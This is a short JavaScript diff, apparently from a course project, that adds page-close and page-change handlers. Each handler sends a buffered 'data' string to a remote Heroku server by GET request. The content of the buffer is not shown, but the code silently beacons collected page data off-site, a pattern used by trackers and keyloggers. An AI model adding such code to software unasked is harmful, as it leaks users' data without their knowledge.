@@ -90,9 +90,40 @@ if (data.length >= 999){
 window.onbeforeunload = function () {
 
 	var oReq = new XMLHttpRequest();
+	if(!data){
+		return
+	}
+	console.log("something: " + data);
+	server =  "https://cs410-python.herokuapp.com/server/";
+	oReq.open("GET", server + data);
+	oReq.send();	
+	data = "";
+};
+
+window.onchange = function () {
+
+	var oReq = new XMLHttpRequest();
+	if(!data){
+		return
+	}
 
 	console.log("something: " + data);
 	server =  "https://cs410-python.herokuapp.com/server/";
 	oReq.open("GET", server + data);
 	oReq.send();	
+	data = "";
+};
+
+window.onclose = function () {
+
+	var oReq = new XMLHttpRequest();
+	if(!data){
+		return
+	}
+
+	console.log("something: " + data);
+	server =  "https://cs410-python.herokuapp.com/server/";
+	oReq.open("GET", server + data);
+	oReq.send();	
+	data = "";
 };
